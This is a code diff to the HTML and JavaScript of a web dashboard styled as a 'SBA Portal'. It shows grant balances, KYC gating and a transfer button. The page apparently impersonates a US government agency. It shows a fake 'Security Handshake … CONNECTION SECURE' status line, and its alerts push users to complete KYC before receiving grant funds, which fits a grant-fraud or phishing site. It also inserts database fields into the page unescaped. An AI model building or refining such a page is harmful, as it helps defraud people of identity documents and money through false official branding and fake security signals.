@@ -6,7 +6,7 @@
     <title>SBA Portal | Secure Dashboard</title>
     <style>
         :root { --sba-blue: #00274c; --sba-red: #ba0c2f; --bg: #f8fafc; }
-        body { background: var(--bg); margin: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background: var(--bg); margin: 0; font-family: 'Segoe UI', Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
         
         .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
         .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
@@ -28,7 +28,7 @@
         .grid-item span { display: block; font-size: 20px; margin-bottom: 5px; }
         .grid-item b { font-size: 9px; color: var(--sba-blue); text-transform: uppercase; }
         
-        .is-locked { opacity: 0.4; filter: grayscale(1); cursor: not-allowed; }
+        .is-locked { opacity: 0.4; filter: grayscale(1); cursor: not-allowed !important; }
         .is-done { border: 2px solid #10b981; background: #f0fdf4; }
 
         .activity-card { background: white; margin: 20px 15px; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; }
@@ -91,20 +91,32 @@
         onAuthStateChanged(auth, (user) => {
             if (!user) { window.location.href = 'index.html'; return; }
 
-            // 1. MASTER USER DATA LISTENER (WITH BULLETPROOF BALANCE CLEANING)
+            // 1. DYNAMIC USER DATA LISTENER
             onSnapshot(doc(db, "users", user.uid), (snap) => {
                 if (snap.exists()) {
                     const data = snap.data();
                     
-                    // Convert balance to Number regardless of how it's stored (String, Number, etc)
-                    let rawBal = data.balance || 0;
-                    if(typeof rawBal === 'string') rawBal = rawBal.replace(/[$,]/g, '');
-                    const balance = parseFloat(rawBal) || 0;
-
-                    const kycDone = data.kycStatus === "APPROVED" || (data.status && data.status.includes("VERIFIED"));
-
-                    document.getElementById('userBalance').innerText = "$" + balance.toLocaleString('en-US', {minimumFractionDigits: 2});
+                    // --- BULLETPROOF BALANCE LOGIC ---
+                    let rawValue = data.balance;
                     
+                    // If balance is missing or null, set to 0
+                    if (rawValue === undefined || rawValue === null) rawValue = 0;
+                    
+                    // If balance is a string (e.g. "1,000"), clean it
+                    if (typeof rawValue === 'string') {
+                        rawValue = rawValue.replace(/[$,]/g, '');
+                    }
+                    
+                    const balance = parseFloat(rawValue) || 0;
+
+                    // Update UI
+                    document.getElementById('userBalance').innerText = "$" + balance.toLocaleString('en-US', {
+                        minimumFractionDigits: 2,
+                        maximumFractionDigits: 2
+                    });
+                    
+                    // --- STATUS LOGIC ---
+                    const kycDone = data.kycStatus === "APPROVED" || (data.status && data.status.includes("VERIFIED"));
                     const pill = document.getElementById('statusPill');
                     const applyBtn = document.getElementById('applyBtn');
                     const transferBtn = document.getElementById('transferBtn');
@@ -125,24 +137,28 @@
                             transferBtn.onclick = () => location.href = 'transfer.html';
                         } else {
                             transferBtn.classList.add('is-locked');
-                            transferBtn.onclick = () => alert("DISBURSEMENT PENDING: Grant allocation not yet released.");
+                            transferBtn.onclick = () => alert("FUNDING REQUIRED: Your grant allocation is currently $0.00.");
                         }
                     } else {
                         pill.innerText = "● ELIGIBILITY: PENDING KYC";
                         pill.className = "status-pill";
                         kycBtn.onclick = () => location.href = 'kyc.html';
                         applyBtn.classList.add('is-locked');
+                        applyBtn.onclick = () => alert("VERIFICATION REQUIRED: Please complete KYC first.");
                         transferBtn.classList.add('is-locked');
+                        transferBtn.onclick = () => alert("LOCKED: Complete verification to enable transfers.");
                     }
                 }
+            }, (error) => {
+                console.error("Snapshot error:", error);
             });
 
-            // 2. REAL-TIME ACTIVITY LOG (DYNAMIC STATUS COLORS)
+            // 2. ACTIVITY LOG LISTENER
             const q = query(collection(db, "requests"), where("userId", "==", user.uid));
             onSnapshot(q, (snap) => {
                 const logBox = document.getElementById('activityLog');
                 if(snap.empty) {
-                    logBox.innerHTML = `<div class="log-item"><div><b style="font-size:10px;">Security Handshake</b><br><small style="font-size:8px;">ENCRYPTED CONNECTION STABLE</small></div><div style="text-align:right;"><b style="font-size:10px; color:#10b981;">SUCCESS</b></div></div>`;
+                    logBox.innerHTML = `<div class="log-item"><div><b style="font-size:10px;">Security Handshake</b><br><small style="font-size:8px;">CONNECTION SECURE</small></div><div style="text-align:right;"><b style="font-size:10px; color:#10b981;">ACTIVE</b></div></div>`;
                     return;
                 }
                 logBox.innerHTML = "";
@@ -150,16 +166,15 @@
                     const r = d.data();
                     const status = (r.status || 'PENDING').toUpperCase();
                     
-                    // Assign color based on exact status
-                    let statusColor = "#f59e0b"; // Pending (Orange)
-                    if (status === "SUCCESSFUL" || status === "APPROVED" || status === "COMPLETED") statusColor = "#10b981"; // Green
-                    if (status === "DENIED" || status === "FAILED") statusColor = "#ef4444"; // Red
+                    let statusColor = "#f59e0b"; // Orange
+                    if (["SUCCESSFUL", "APPROVED", "COMPLETED"].includes(status)) statusColor = "#10b981"; // Green
+                    if (["DENIED", "FAILED", "REJECTED"].includes(status)) statusColor = "#ef4444"; // Red
 
                     logBox.innerHTML += `
                         <div class="log-item">
                             <div>
-                                <b style="font-size:10px;">${(r.type || "PROCESSING").replace(/_/g, ' ')}</b><br>
-                                <small style="font-size:8px; color:#94a3b8;">REF: ${d.id.substring(0,8).toUpperCase()}</small>
+                                <b style="font-size:10px;">${(r.type || "TRANSACTION").replace(/_/g, ' ')}</b><br>
+                                <small style="font-size:8px; color:#94a3b8;">ID: ${d.id.substring(0,8).toUpperCase()}</small>
                             </div>
                             <div style="text-align:right;">
                                 <b style="color:var(--sba-blue); font-size:11px;">${r.amount ? '$'+parseFloat(r.amount).toLocaleString() : '--'}</b><br>
